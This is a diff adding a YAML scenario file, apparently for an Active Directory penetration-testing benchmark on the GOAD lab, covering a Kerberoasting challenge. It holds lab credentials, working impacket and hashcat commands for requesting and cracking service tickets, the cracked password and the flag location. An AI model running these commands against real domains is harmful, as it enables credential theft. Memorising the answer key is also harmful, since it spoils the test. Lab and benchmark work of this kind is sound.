@@ -1,0 +1,55 @@
+scenario:
+  id: AD-01
+  name: "Kerberoasting"
+  technique: "Kerberoasting (ATT&CK T1558.003)"
+  difficulty: L1
+
+network:
+  dc_ip: 192.168.56.10
+  domain: north.sevenkingdoms.local
+  dc_hostname: winterfell
+  subnet: 192.168.56.0/24
+
+attacker:
+  entry_point: "Kali Linux jump host (192.168.56.50)"
+  credentials:
+    username: lowpriv
+    password: "Password123!"
+    domain: north
+  tools:
+    - impacket-GetUserSPNs
+    - hashcat
+    - john
+
+target:
+  service_account: svc_sql
+  spn: "MSSQLSvc/castelblack.north.sevenkingdoms.local:1433"
+  password_hint: "weak password (rockyou.txt crackable)"
+
+flag:
+  location: "AD user 'svc_sql' description attribute"
+  format: "flag{ad-01-xxxxxxxx}"
+
+defense:
+  windows_defender: on
+  smb_signing: enabled
+  patch_level: "Jan 2024"
+
+# GOAD Setup (run on host with Vagrant installed):
+#   cd /home/kianabin/benchmark/GOAD
+#   source .venv/bin/activate
+#   ansible-playbook -i inventory ansible/ad01_setup.yml
+#   vagrant snapshot save ad-01-base
+
+notes: |
+  This scenario requires:
+  1. VirtualBox 7.0+ and Vagrant 2.3+ installed
+  2. GOAD environment deployed (vagrant up from ~/benchmark/GOAD)
+  3. Run ansible-playbook to inject flag and create vulnerable accounts
+  4. Attacker connects from Kali jump host to enumerate SPNs
+
+  Attack path:
+  1. impacket-GetUserSPNs north.sevenkingdoms.local/lowpriv:Password123! -dc-ip 192.168.56.10 -request
+  2. Crack TGS with hashcat: hashcat -m 13100 tgs.hash rockyou.txt
+  3. Crack password is "Summer2024!"
+  4. Flag is in the svc_sql user's description attribute in AD
